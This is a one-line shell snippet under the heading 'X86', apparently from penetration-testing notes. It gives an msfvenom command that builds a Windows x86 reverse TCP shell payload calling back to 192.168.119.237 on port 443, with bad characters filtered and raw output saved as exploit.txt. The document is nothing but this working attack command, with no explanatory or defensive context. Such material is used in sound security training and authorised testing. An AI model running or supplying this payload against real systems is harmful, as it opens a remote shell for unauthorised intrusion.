### X86

```shell
msfvenom --platform windows --arch x86  -p windows/shell_reverse_tcp  LHOST=192.168.119.237 LPORT=443 -b '\x00\x0a\x1a\x39\x85\xeb' -f raw -o exploit.txt
```